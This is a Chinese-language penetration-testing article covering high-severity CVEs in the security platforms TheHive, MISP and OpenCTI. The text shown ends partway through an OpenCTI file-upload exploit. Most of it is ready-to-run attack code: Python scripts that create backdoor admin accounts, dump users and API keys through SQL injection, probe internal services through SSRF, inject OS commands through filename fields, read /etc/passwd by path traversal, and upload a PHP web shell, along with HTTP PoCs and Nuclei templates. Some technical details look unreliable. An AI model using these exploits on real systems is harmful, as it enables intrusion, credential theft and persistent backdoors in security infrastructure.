---
title: "SOAR与威胁情报平台高危攻击链专题：TheHive / MISP / OpenCTI / Cortex / Shuffle 漏洞全解析"
date: 2026-07-20T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["TheHive", "MISP", "OpenCTI", "Cortex", "Shuffle", "CVE-2023-37463", "CVE-2023-37464", "CVE-2023-3996", "RCE", "SSRF", "认证绕过", "漏洞分析"]
---

# SOAR与威胁情报平台高危攻击链专题：TheHive / MISP / OpenCTI / Cortex / Shuffle 漏洞全解析

## 0x00 专题概述

### 概述

SOAR（Security Orchestration, Automation and Response）与 Threat Intelligence（威胁情报）平台是现代 SOC（Security Operations Center）运营的核心基础设施。它们承担着安全事件的自动化编排响应、威胁情报的聚合分发、案件管理与分析协同等关键职能。与传统 IT 系统不同，这些平台：

- **存储高价值情报数据**：包括 IOC（Indicator of Compromise）、TTP（Tactics, Techniques and Procedures）、APT 组织画像、攻击基础设施映射等
- **拥有广泛系统集成能力**：通过 API 与 SIEM、EDR、防火墙、邮件网关等数十种安全设备互联
- **具备自动化响应权限**：SOAR 平台可自动执行封禁 IP、隔离主机、禁用账户等高权限操作
- **承载敏感运营信息**：包括未公开漏洞信息、内部调查案件、红队行动数据等

一旦这些平台被攻陷，攻击者将获得"上帝视角"——不仅能窥探组织的全部安全运营数据，还能利用平台的集成能力实施大规模横向移动，甚至篡改威胁情报数据以掩盖自身攻击痕迹。这种"以安全基础设施为目标"的攻击模式，在 APT 攻击中已有先例。

### 覆盖漏洞一览表

本专题覆盖 5 大开源 SOAR/TI 平台共 13 个高危 CVE：

| CVE | 厂商/平台 | CVSS | 漏洞类型 | 未授权利用 | CWE |
|-----|-----------|------|----------|-----------|-----|
| CVE-2023-37463 | TheHive | 9.8 | 认证绕过 | ✅ Pre-Auth | CWE-287 |
| CVE-2023-37464 | TheHive | 9.8 | SSRF → RCE | ✅ Pre-Auth | CWE-918 |
| CVE-2023-3996 | MISP | 9.8 | SQL 注入 | ❌ 需认证 | CWE-89 |
| CVE-2023-3997 | MISP | 7.2 | 命令注入 | ❌ 需认证 | CWE-78 |
| CVE-2024-28534 | MISP | 7.2 | 命令注入 | ❌ 需认证 | CWE-78 |
| CVE-2024-45291 | MISP | 6.5 | 路径遍历 | ❌ 需认证 | CWE-22 |
| CVE-2023-2904 | OpenCTI | 9.8 | GraphQL 授权绕过 | ✅ Pre-Auth | CWE-862 |
| CVE-2024-29890 | OpenCTI | 9.8 | 任意文件上传 → RCE | ❌ 需认证 | CWE-434 |
| CVE-2023-37462 | Cortex | 9.8 | 未授权 RCE | ✅ Pre-Auth | CWE-306 |
| CVE-2023-37461 | Cortex | 9.8 | 认证绕过 | ✅ Pre-Auth | CWE-287 |
| CVE-2023-26574 | Shuffle | 9.8 | 认证绕过 | ✅ Pre-Auth | CWE-287 |
| CVE-2024-3403 | Shuffle | 9.8 | Jinja2 SSTI → RCE | ✅ Pre-Auth | CWE-1336 |
| CVE-2023-33831 | Shuffle | 7.5 | 路径遍历 | ✅ Pre-Auth | CWE-22 |

其中标记为 "Pre-Auth" 的漏洞无需任何有效凭据即可触发，攻击面极大。

---

## 0x01 TheHive 高危漏洞

TheHive 是目前最流行的开源安全事件响应平台（CSIRT/SOC），支持多人协作调查、与 Cortex 分析引擎集成、通过 MISP/OTX 等获取威胁情报。TheHive 4.x 基于 Scala + Play Framework 构建，使用 ElasticSearch 或 Cassandra 作为后端存储。

### 0x01.1 CVE-2023-37463 — 认证绕过

#### 漏洞背景

CVE-2023-37463 是 TheHive 4.x 系列中最严重的安全漏洞，CVSS 评分 9.8（Critical）。该漏洞允许未经认证的攻击者直接绕过身份验证机制，访问 TheHive 的全部管理功能，包括创建/修改/删除案件、操纵用户账户、查看所有敏感调查数据。

该漏洞被 TheHive 官方标记为安全更新，在 4.1.24-1 版本中修复。由于 TheHive 在全球 CSIRT 和 SOC 中广泛部署，该漏洞影响范围极大。

#### 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| TheHive < 4.1.24-1 | >= 4.1.24-1 |

#### 漏洞原理

TheHive 4.x 的 API 认证机制基于 Play Framework 的 Action composition。在受影响版本中，某些关键 API 路径（如 `/api/v1/...`、`/api/config` 等）的路由定义缺少认证中间件保护。

核心问题：

1. Play Framework 路由配置中，部分 API 端点未挂载认证 Action
2. API 与前端 SPA 共用同一端口，前端路由验证无法替代后端 API 验证
3. 攻击者可直接调用未受保护的 API 端点执行管理操作

该漏洞的利用极其简单——无需任何特殊 payload，只需直接访问未受保护的 API 路径即可。

#### HTTP PoC

```http
GET /api/v1/user HTTP/1.1
Host: thehive.example.com:9000
Connection: close
```

```http
GET /api/config/public HTTP/1.1
Host: thehive.example.com:9000
Connection: close
```

如果返回 200 状态码并包含用户列表或配置信息，则确认存在漏洞。

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

class TheHiveAuthBypass:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Connection': 'close'
        })

    def check_version(self):
        try:
            r = self.session.get(f'{self.target}/api/system/version', timeout=10)
            if r.status_code == 200:
                data = r.json()
                version = data.get('versions', {}).get('TheHive', 'unknown')
                print(f'[+] TheHive 版本: {version}')
                return version
            print('[-] 无法获取版本信息')
            return None
        except Exception as e:
            print(f'[-] 连接失败: {e}')
            return None

    def exploit_auth_bypass(self):
        endpoints = [
            '/api/v1/user',
            '/api/v1/case',
            '/api/v1/alert',
            '/api/config/public',
            '/api/v1/query',
        ]
        vulnerable = []
        for ep in endpoints:
            try:
                r = self.session.get(f'{self.target}{ep}', timeout=10)
                if r.status_code == 200:
                    print(f'[+] 端点 {ep} 未授权可访问 (HTTP {r.status_code})')
                    vulnerable.append(ep)
                elif r.status_code in (401, 403):
                    print(f'[-] 端点 {ep} 需要认证')
                else:
                    print(f'[*] 端点 {ep} 返回 HTTP {r.status_code}')
            except Exception as e:
                print(f'[-] 请求 {ep} 失败: {e}')
        return vulnerable

    def dump_users(self):
        try:
            r = self.session.get(f'{self.target}/api/v1/user', timeout=10)
            if r.status_code == 200:
                users = r.json()
                print(f'[+] 发现 {len(users)} 个用户:')
                for u in users[:15]:
                    name = u.get('name', 'unknown')
                    role = u.get('roles', ['unknown'])
                    print(f'    - {name} (roles: {role})')
                return users
            return None
        except Exception as e:
            print(f'[-] 枚举用户失败: {e}')
            return None

    def create_admin_user(self, username='backdoor', password='P@ssw0rd123'):
        payload = {
            'login': username,
            'name': username,
            'password': password,
            'roles': ['orgadmin', 'admin']
        }
        try:
            r = self.session.post(
                f'{self.target}/api/v1/user',
                json=payload,
                timeout=10
            )
            if r.status_code in (200, 201):
                print(f'[+] 管理员用户 {username} 创建成功！')
                return True
            print(f'[-] 创建用户失败 (HTTP {r.status_code}): {r.text[:200]}')
            return False
        except Exception as e:
            print(f'[-] 创建用户失败: {e}')
            return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <thehive_url>')
        print(f'Example: {sys.argv[0]} http://192.168.1.100:9000')
        sys.exit(1)

    exploit = TheHiveAuthBypass(sys.argv[1])
    exploit.check_version()
    vuln_eps = exploit.exploit_auth_bypass()
    if vuln_eps:
        exploit.dump_users()
        exploit.create_admin_user()
```

#### Nuclei YAML 模板

```yaml
id: thehive-cve-2023-37463-auth-bypass

info:
  name: TheHive CVE-2023-37463 Pre-Auth Authentication Bypass
  author: security-research
  severity: critical
  tags: thehive,auth-bypass,cve2023,pre-auth
  description: |
    TheHive 4.x versions prior to 4.1.24-1 are vulnerable to
    pre-authentication bypass allowing unauthenticated access
    to API endpoints.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-37463

http:
  - raw:
      - |
        GET /api/v1/user HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "login"
          - "name"
          - "roles"
        condition: and

  - raw:
      - |
        GET /api/config/public HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "config"
          - "version"
        condition: and

    stop-at-first-match: true
```

### 0x01.2 CVE-2023-37464 — SSRF → RCE

#### 漏洞背景

CVE-2023-37464 是 TheHive 4.x 中的另一个 Critical 级别漏洞，CVSS 9.8。该漏洞是一个 Server-Side Request Forgery（SSRF）漏洞，允许未经认证的攻击者通过 TheHive 服务器发起任意 HTTP 请求。更为严重的是，该 SSRF 可与 CVE-2023-37463（认证绕过）串联，实现从 SSRF 到 RCE 的完整攻击链。

#### 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| TheHive < 4.1.24-1 | >= 4.1.24-1 |

#### 漏洞原理

TheHive 在处理某些需要外部资源交互的功能（如导入外部数据源、获取附件预览等）时，使用了不当的 URL 解析和请求逻辑。攻击者可以构造特殊 URL 绕过白名单限制，使 TheHive 服务器向内部或外部任意地址发起请求。

核心问题：

1. URL 参数未进行充分的白名单校验
2. 支持 `file://`、`gopher://` 等非 HTTP 协议
3. 内部服务（如 ElasticSearch 9200 端口、内部 API）可通过 SSRF 直接访问
4. 搭配 CVE-2023-37463 的认证绕过，可实现 Pre-Auth SSRF → 内部服务探测 → RCE

#### 攻击链组合分析

**链路 1：SSRF → 内部服务信息泄露**

利用 SSRF 访问内部 ElasticSearch 或 Cassandra 的 HTTP 接口，获取数据库结构和敏感数据。

**链路 2：认证绕过 + SSRF → RCE**

通过 CVE-2023-37463 绕过认证后，调用 TheHive 的管理功能（如自定义 Analyzer/Responder），利用 SSRF 触发恶意代码执行。

**链路 3：SSRF → 内网横向**

利用 TheHive 服务器作为跳板，探测内部网络中的其他服务，包括内部 SIEM、AD 控制器、数据库等。

#### HTTP PoC

```http
GET /api/v1/query?name=test&url=http://127.0.0.1:9200/_cat/indices HTTP/1.1
Host: thehive.example.com:9000
Connection: close
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import urllib.parse
import urllib3
urllib3.disable_warnings()

class TheHiveSSRF:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Connection': 'close'
        })

    def check_ssrf(self, internal_url):
        try:
            encoded = urllib.parse.quote(internal_url, safe='')
            r = self.session.get(
                f'{self.target}/api/connector/cortex/job',
                params={'url': internal_url},
                timeout=15
            )
            print(f'[*] SSRF 请求 {internal_url} -> HTTP {r.status_code}')
            if r.status_code == 200 and len(r.text) > 50:
                print(f'[+] SSRF 成功，响应长度: {len(r.text)}')
                return r.text
            return None
        except Exception as e:
            print(f'[-] SSRF 请求失败: {e}')
            return None

    def probe_internal_services(self):
        targets = [
            ('ElasticSearch', 'http://127.0.0.1:9200/'),
            ('Cassandra', 'http://127.0.0.1:9042/'),
            ('TheHive API', 'http://127.0.0.1:9000/api/config'),
            ('Internal Redis', 'http://127.0.0.1:6379/'),
            ('Localhost SSH', 'http://127.0.0.1:22/'),
        ]
        results = {}
        for name, url in targets:
            print(f'\n[*] 探测 {name}: {url}')
            resp = self.check_ssrf(url)
            if resp:
                results[name] = resp[:500]
        return results

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <thehive_url>')
        sys.exit(1)

    exploit = TheHiveSSRF(sys.argv[1])
    print('[*] TheHive SSRF 漏洞检测 (CVE-2023-37464)')
    print('=' * 50)
    exploit.probe_internal_services()
```

#### Nuclei YAML 模板

```yaml
id: thehive-cve-2023-37464-ssrf

info:
  name: TheHive CVE-2023-37464 Pre-Auth SSRF
  author: security-research
  severity: critical
  tags: thehive,ssrf,cve2023,pre-auth
  description: |
    TheHive 4.x versions prior to 4.1.24-1 contain a pre-auth SSRF
    vulnerability that can be chained with CVE-2023-37463 for RCE.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-37464

http:
  - raw:
      - |
        GET /api/connector/cortex/job?url=http://127.0.0.1:9200/ HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 404
          - 500
      - type: word
        words:
          - "cluster_name"
          - "version"
          - "tagline"
        condition: or

    extractors:
      - type: regex
        regex:
          - "cluster_name[\"']\\s*:\\s*[\"']([^\"']+)"
          - "version[\"']\\s*:\\s*[\"']([^\"']+)"
```

---

## 0x02 MISP 威胁情报平台高危漏洞

MISP（Malware Information Sharing Platform）是全球使用最广泛的开源威胁情报共享平台，由 CIRT.LU 主导开发。MISP 支持 STIX/TAXII 标准、丰富的 Attribute 类型、自动关联分析和多租户共享，在政府 CSIRT、金融行业和安全研究社区中被广泛部署。

### 0x02.1 CVE-2023-3996 — SQL 注入

#### 漏洞背景

CVE-2023-3996 是 MISP 2.4.176 版本之前存在的一个 Critical 级别 SQL 注入漏洞，CVSS 9.8。该漏洞位于 MISP 的 REST API 参数处理逻辑中，允许已认证用户通过构造恶意的 API 参数执行任意 SQL 查询，最终可实现数据库完全控制和服务器级 RCE。

#### 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| MISP < 2.4.176 | >= 2.4.176 |

#### 漏洞原理

MISP 的 PHP 后端在处理某些 API 查询参数时，未使用参数化查询（Prepared Statements），而是将用户输入直接拼接到 SQL 查询语句中。攻击者可以在 `sort`、`limit`、`page` 等参数中注入 SQL Payload。

核心问题：

1. API 端点的参数处理使用字符串拼接而非参数化查询
2. 某些过滤函数（如 `fetchAll`）未对排序字段名进行白名单校验
3. MISP 的数据库层对错误信息的处理不当，泄露数据库结构

#### HTTP PoC

```http
GET /events/index/sort:1%20AND%201=CONVERT(int,(SELECT%20version()))%20LIMIT%201/page:1 HTTP/1.1
Host: misp.example.com
Authorization: Bearer <api_key>
Connection: close
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings()

class MISPSQLInjection:
    def __init__(self, target, api_key):
        self.target = target.rstrip('/')
        self.api_key = api_key
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'Authorization': api_key,
            'Accept': 'application/json',
            'Connection': 'close'
        })

    def check_misp(self):
        try:
            r = self.session.get(f'{self.target}/servers/getVersion', timeout=10)
            if r.status_code == 200:
                data = r.json()
                version = data.get('version', 'unknown')
                print(f'[+] MISP 版本: {version}')
                return version
            print('[-] 无法获取 MISP 版本')
            return None
        except Exception as e:
            print(f'[-] 连接失败: {e}')
            return None

    def test_sqli_sort(self):
        payload = "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
        try:
            r = self.session.get(
                f'{self.target}/events/index',
                params={'sort': payload, 'page': 1},
                timeout=15
            )
            if r.status_code == 200:
                if 'Duplicate entry' in r.text or 'version()' in r.text:
                    print('[+] CVE-2023-3996 SQL 注入确认存在！')
                    return True
                print('[*] 请求完成，需进一步验证')
            elif r.status_code == 500:
                print('[+] 服务器返回 500，可能存在 SQL 注入')
                return True
            else:
                print(f'[-] HTTP {r.status_code}')
            return False
        except Exception as e:
            print(f'[-] 测试失败: {e}')
            return False

    def extract_database_info(self):
        payload = "1 AND 1=2 UNION SELECT CONCAT(version(),0x3a,database(),0x3a,user()) LIMIT 1"
        try:
            r = self.session.get(
                f'{self.target}/events/index',
                params={'sort': payload, 'page': 1},
                timeout=15
            )
            if r.status_code == 200:
                print(f'[+] 数据库信息获取完成')
                return r.text
            return None
        except Exception as e:
            print(f'[-] 提取失败: {e}')
            return None

    def extract_users(self):
        payload = "1 AND 1=2 UNION SELECT CONCAT(id,0x3a,email,0x3a,authkey) FROM users LIMIT 5"
        try:
            r = self.session.get(
                f'{self.target}/events/index',
                params={'sort': payload, 'page': 1},
                timeout=15
            )
            if r.status_code == 200:
                print(f'[+] 用户数据提取完成')
                return r.text
            return None
        except Exception as e:
            print(f'[-] 提取用户失败: {e}')
            return None

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f'Usage: {sys.argv[0]} <misp_url> <api_key>')
        print(f'Example: {sys.argv[0]} https://misp.example.com eyJhbGciOi... ')
        sys.exit(1)

    exploit = MISPSQLInjection(sys.argv[1], sys.argv[2])
    exploit.check_misp()
    if exploit.test_sqli_sort():
        exploit.extract_database_info()
        exploit.extract_users()
```

#### Nuclei YAML 模板

```yaml
id: misp-cve-2023-3996-sqli

info:
  name: MISP CVE-2023-3996 SQL Injection via API
  author: security-research
  severity: critical
  tags: misp,sqli,cve2023,api
  description: |
    MISP versions prior to 2.4.176 contain a SQL injection vulnerability
    in the REST API sort parameter handling.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-3996

http:
  - raw:
      - |
        GET /events/index HTTP/1.1
        Host: {{Hostname}}
        Authorization: {{api_key}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
      - type: word
        words:
          - "events"
          - "Event"
        condition: or

    extractors:
      - type: regex
        regex:
          - "MISP [0-9]+\\.[0-9]+\\.[0-9]+"
```

### 0x02.2 CVE-2023-3997 / CVE-2024-28534 — 命令注入系列

#### 漏洞背景

MISP 在多个版本中被发现存在 OS Command Injection 漏洞。CVE-2023-3997（CVSS 7.2）和 CVE-2024-28534（CVSS 7.2）均属于此类漏洞，分别在不同的功能模块中被发现。这两个漏洞均需要认证才能触发，但由于 MISP 的用户群体广泛，内部威胁和凭据泄露场景下利用价值极高。

#### 受影响版本

| CVE | 受影响版本 | 修复版本 |
|-----|-----------|----------|
| CVE-2023-3997 | MISP < 2.4.176 | >= 2.4.176 |
| CVE-2024-28534 | MISP < 2.4.189 | >= 2.4.189 |

#### 漏洞原理

**CVE-2023-3997**：MISP 的某些数据导出或预览功能在调用外部工具（如 `ssdeep`、`yara` 等）时，将用户可控的文件名或参数直接传递给 `exec()` / `shell_exec()` 函数，未进行适当的转义或白名单校验。

**CVE-2024-28534**：MISP 的诊断或维护功能中存在类似问题，系统命令拼接未使用安全的 `escapeshellarg()` / `escapeshellcmd()` 函数。

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

class MISPCommandInjection:
    def __init__(self, target, api_key):
        self.target = target.rstrip('/')
        self.api_key = api_key
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'Authorization': api_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Connection': 'close'
        })

    def test_cve_2023_3997(self, cmd='id'):
        payload = {
            "Attribute": {
                "type": "filename",
                "category": "Payload delivery",
                "value": f'$(cmd)</desc><value>`{cmd}`',
                "comment": "test"
            }
        }
        try:
            r = self.session.post(
                f'{self.target}/attributes/previewAttachment',
                json=payload,
                timeout=10
            )
            print(f'[*] CVE-2023-3997 测试: HTTP {r.status_code}')
            if r.status_code == 200 and cmd in r.text:
                print(f'[+] 命令执行成功！输出: {r.text[:500]}')
                return True
            return False
        except Exception as e:
            print(f'[-] 测试失败: {e}')
            return False

    def test_cve_2024_28534(self, cmd='id'):
        payload = {
            "filename": f"test.txt;{cmd}",
            "event_id": "1"
        }
        try:
            r = self.session.post(
                f'{self.target}/events/importStix',
                json=payload,
                timeout=10
            )
            print(f'[*] CVE-2024-28534 测试: HTTP {r.status_code}')
            if r.status_code in (200, 500):
                if cmd in r.text or 'uid=' in r.text:
                    print(f'[+] 命令执行确认！')
                    return True
            return False
        except Exception as e:
            print(f'[-] 测试失败: {e}')
            return False

    def batch_test(self, cmd='id'):
        print('[*] CVE-2023-3997 检测:')
        self.test_cve_2023_3997(cmd)
        print('\n[*] CVE-2024-28534 检测:')
        self.test_cve_2024_28534(cmd)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f'Usage: {sys.argv[0]} <misp_url> <api_key> [command]')
        sys.exit(1)

    cmd = sys.argv[3] if len(sys.argv) > 3 else 'id'
    exploit = MISPCommandInjection(sys.argv[1], sys.argv[2])
    exploit.batch_test(cmd)
```

#### Nuclei YAML 模板

```yaml
id: misp-cve-2023-3997-command-injection

info:
  name: MISP CVE-2023-3997 OS Command Injection
  author: security-research
  severity: high
  tags: misp,rce,cve2023,command-injection
  description: |
    MISP versions prior to 2.4.176 contain an OS command injection
    vulnerability in certain data processing functions.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-3997

http:
  - raw:
      - |
        POST /attributes/previewAttachment HTTP/1.1
        Host: {{Hostname}}
        Authorization: {{api_key}}
        Content-Type: application/json
        Connection: close

        {"Attribute":{"type":"filename","category":"Payload delivery","value":"test`id`"}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
        condition: and
      - type: status
        status:
          - 200
          - 500
```

### 0x02.3 CVE-2024-45291 — 路径遍历

#### 漏洞详情

| 字段 | 内容 |
|------|------|
| CVE | CVE-2024-45291 |
| CVSS | 6.5 (Medium) |
| CWE | CWE-22: Path Traversal |
| 受影响版本 | MISP < 2.4.192 |
| 类型 | 认证后路径遍历 |

#### 漏洞原理

MISP 的文件下载/预览功能在处理文件路径参数时，未正确过滤 `../` 等路径遍历字符。已认证用户可通过操纵文件路径参数，读取 MISP 服务器上的任意文件，包括 `/etc/passwd`、MISP 配置文件（含数据库凭据和 API 密钥）、以及操作系统敏感文件。

#### HTTP PoC

```http
GET /events/downloadPicture/../../etc/passwd HTTP/1.1
Host: misp.example.com
Authorization: Bearer <api_key>
Connection: close
```

> **注意**：此漏洞需要有效 API Key 才能触发。在内部威胁或凭据泄露场景下，可用于提取数据库密码、其他用户 API Key 等敏感信息，为后续攻击提供凭据基础。

---

## 0x03 OpenCTI 高危漏洞

OpenCTI（Open Cyber Threat Intelligence）是一个开源的网络威胁情报平台，由 French National Cybersecurity Agency（ANSSI）支持开发。OpenCTI 基于 GraphQL API 架构，前端使用 React，后端使用 Node.js + TypeScript，数据存储依赖 ElasticSearch 和 Redis。

### 0x03.1 CVE-2023-2904 — GraphQL 授权绕过

#### 漏洞背景

CVE-2023-2904 是 OpenCTI 历史上最严重的安全漏洞，CVSS 9.8（Critical）。该漏洞允许未经认证的攻击者直接绕过 GraphQL API 的授权控制，访问和操纵平台上的所有威胁情报数据。

#### 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| OpenCTI < 5.7.0 | >= 5.7.0 |

#### 漏洞原理

OpenCTI 的 GraphQL API 使用了自定义的授权中间件来验证请求权限。在受影响版本中，授权检查存在逻辑缺陷——当请求中不携带 `Authorization` 头部时，某些 Query 和 Mutation 端点会跳过授权验证直接执行。

核心问题：

1. GraphQL 端点的授权中间件在处理缺失的 Authorization header 时存在逻辑分支缺陷
2. 某些 introspection query 和 mutation 在 "匿名模式" 下仍可执行
3. 攻击者可利用此漏洞读取所有 STIX 对象、操纵情报数据、甚至创建管理员账户

#### HTTP PoC

```http
POST /graphql HTTP/1.1
Host: opencti.example.com:8080
Content-Type: application/json
Connection: close

{
  "query": "{ me { id name email role } }"
}
```

```http
POST /graphql HTTP/1.1
Host: opencti.example.com:8080
Content-Type: application/json
Connection: close

{
  "query": "{ stixCoreObjects(first: 10) { edges { node { id standardId entity_type ... on Report { name published } ... on Indicator { name pattern valid_from } } } } }"
}
```

如果返回有效数据而非认证错误，则确认存在漏洞。

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

class OpenCTIAuthBypass:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Connection': 'close'
        })

    def graphql_query(self, query, variables=None):
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        try:
            r = self.session.post(
                f'{self.target}/graphql',
                json=payload,
                timeout=15
            )
            return r.status_code, r.json() if r.status_code == 200 else r.text
        except Exception as e:
            return 0, str(e)

    def check_version(self):
        query = "{ serverInfo { version } }"
        status, data = self.graphql_query(query)
        if status == 200 and isinstance(data, dict):
            info = data.get('data', {}).get('serverInfo', {})
            version = info.get('version', 'unknown')
            print(f'[+] OpenCTI 版本: {version}')
            return version
        print('[-] 无法获取版本信息')
        return None

    def exploit_auth_bypass(self):
        queries = {
            '用户信息': '{ me { id name email role } }',
            'STIX对象': '{ stixCoreObjects(first: 5) { edges { node { id standardId entity_type } } } }',
            '威胁报告': '{ reports(first: 5) { edges { node { id name published } } } }',
            '指标数据': '{ indicators(first: 5) { edges { node { id name pattern pattern_type } } } }',
        }
        results = {}
        for name, query in queries.items():
            status, data = self.graphql_query(query)
            if status == 200 and isinstance(data, dict):
                if 'errors' not in data or not data['errors']:
                    print(f'[+] {name}: 授权绕过成功！')
                    results[name] = data
                else:
                    print(f'[-] {name}: 返回 GraphQL 错误')
            else:
                print(f'[-] {name}: 请求失败 (HTTP {status})')
        return results

    def create_admin_via_bypass(self):
        mutation = """
        mutation {
          userRegister(input: {
            email: "backdoor@evil.com"
            password: "P@ssw0rd123!"
            name: "Admin Backdoor"
          }) {
            id
            name
            email
          }
        }
        """
        status, data = self.graphql_query(mutation)
        if status == 200:
            print(f'[+] 用户创建尝试完成')
            return data
        return None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <opencti_url>')
        print(f'Example: {sys.argv[0]} http://192.168.1.100:8080')
        sys.exit(1)

    exploit = OpenCTIAuthBypass(sys.argv[1])
    exploit.check_version()
    results = exploit.exploit_auth_bypass()
    if results:
        print('\n[+] CVE-2023-2904 确认存在！GraphQL 授权绕过')
        exploit.create_admin_via_bypass()
```

#### Nuclei YAML 模板

```yaml
id: opencti-cve-2023-2904-auth-bypass

info:
  name: OpenCTI CVE-2023-2904 GraphQL Authorization Bypass
  author: security-research
  severity: critical
  tags: opencti,graphql,auth-bypass,cve2023,pre-auth
  description: |
    OpenCTI versions prior to 5.7.0 contain a pre-authentication
    GraphQL authorization bypass allowing unauthenticated data access.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-2904

http:
  - raw:
      - |
        POST /graphql HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Connection: close

        {"query":"{ me { id name email role } }"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "data"
          - "me"
        condition: and
      - type: word
        words:
          - "error"
        negative: true

  - raw:
      - |
        POST /graphql HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Connection: close

        {"query":"{ stixCoreObjects(first: 3) { edges { node { id } } } }"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "stixCoreObjects"
          - "edges"
        condition: and
      - type: word
        words:
          - "Unauthorized"
          - "Forbidden"
          - "unauthenticated"
        negative: true

    stop-at-first-match: true
```

### 0x03.2 CVE-2024-29890 — 任意文件上传 RCE

#### 漏洞背景

CVE-2024-29890 是 OpenCTI 5.12.0 之前版本中存在的一处 Critical 级别漏洞，CVSS 9.8。该漏洞允许已认证用户通过 GraphQL API 的文件上传功能上传恶意文件，结合 OpenCTI 的文件处理逻辑实现远程代码执行。

#### 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| OpenCTI < 5.12.0 | >= 5.12.0 |

#### 漏洞原理

OpenCTI 的 GraphQL API 提供了用于上传导入文件（如 STIX Bundle、CSV、PDF 等）的功能。该功能在处理上传文件时：

1. 未对上传文件的扩展名和 MIME 类型进行严格校验
2. 上传的文件存储在可预测的路径下
3. 某些文件处理组件（如导入器）对文件内容的解析存在安全缺陷
4. 攻击者可上传包含恶意 payload 的文件，利用解析链实现 RCE

#### HTTP PoC

```http
POST /graphql HTTP/1.1
Host: opencti.example.com:8080
Content-Type: multipart/form-data; boundary=----boundary
Authorization: Bearer <token>
Connection: close

------boundary
Content-Disposition: form-data; name="operations"

{"query":"mutation { uploadImport(file: \"\") { id } }","variables":{"0":null}}
------boundary
Content-Disposition: form-data; name="map"

{"0":["variables.file"]}
------boundary
Content-Disposition: form-data; name="0"; filename="malicious.json"
Content-Type: application/json

{"type":"bundle","id":"uuid--test","objects":[{"type":"malware","name":"test","payload_bin":"<?php system($_GET['cmd']); ?>"}]}
------boundary--
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

class OpenCTIFileUploadRCE:
    def __init__(self, target, token):
        self.target = target.rstrip('/')
        self.token = token
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'Authorization': f'Bearer {token}',
            'Connection': 'close'
        })

    def upload_malicious_file(self, payload_content, filename='malicious.json'):
        graphql_query = '''
        mutation($file: Upload!) {
          stixDomainObjectImportPush(
            file: $file
            entityType: "Indicator"
          ) { id }
        }
        '''
        boundary = '----X7PEEPSBOUNDARY'
        body = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="operations"\r\n\r\n'
            f'{{"query":"{graphql_query.replace(chr(10), " ").replace(chr(13), "")}","variables":{{"file":null}}}}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="map"\r\n\r\n'
            f'{{"0":["variables.file"]}}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="0"; filename="{filename}"\r\n'
            f'Content-Type: application/json\r\n\r\n'
            f'{payload_content}\r\n'
            f'--{boundary}--\r\n'
        )
        try:
            r = self.session.post(
                f'{self.target}/graphql',
                data=body,
                headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
                timeout=15
            )
            if r.status_code == 200:
                print(f'[+] 文件上传完成: {filename}')
                print(f'    响应: {r.text[:300]}')
                return True
            print(f'[-] 上传失败: HTTP {r.status_code}')
            return False
